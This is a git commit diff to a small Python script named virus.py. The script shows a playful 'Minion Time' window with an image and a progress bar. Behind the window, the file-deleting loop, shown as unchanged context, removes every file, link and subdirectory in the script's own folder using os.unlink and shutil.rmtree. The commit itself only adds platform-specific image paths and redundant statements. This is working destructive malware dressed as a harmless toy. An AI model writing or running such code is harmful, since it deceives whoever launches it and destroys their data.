770c0195f92b0145d6919616f19ed21cda53d800
VToribiot <vtoribiot@gmail.com>
2022-07-16 02:13:51 -0400

    chng

--- virus.py
+++ virus.py
@@ -5,16 +5,21 @@ import sys
 import importlib.util
 import time
 import PySimpleGUI as sg
+import platform
 
 spec = importlib.util.find_spec("PySimpleGUI")
 if spec is None:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "PySimpleGUI"])
 
 folder = os.path.dirname(os.path.abspath(__file__))
+if platform.system() == "Windows":
+    img_path = folder + "\\minion.png"
+elif platform.system() == "Linux":
+    img_path = folder + "/minion.png"
 
 sg.theme('SystemDefaultForReal')
 layout = [[sg.Text('Minion Time', font="Roboto, 50")],
-          [sg.Image(f"{folder}/minion.png")],
+          [sg.Image(f"{img_path}")],
           [sg.Text('Sad nomba:', font="Roboto, 16"), sg.Text('', key='-TEXT-', font="Roboto, 16")],
           [sg.ProgressBar(10000, orientation='h', size=(20, 20), key='progressbar')]]
 
@@ -28,8 +33,10 @@ for filename in os.listdir(folder):
     try:
         if os.path.isfile(file_path) or os.path.islink(file_path):
             os.unlink(file_path)
+            pass
         elif os.path.isdir(file_path):
             shutil.rmtree(file_path)
+            pass
     except Exception as e:
         sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
     finally:
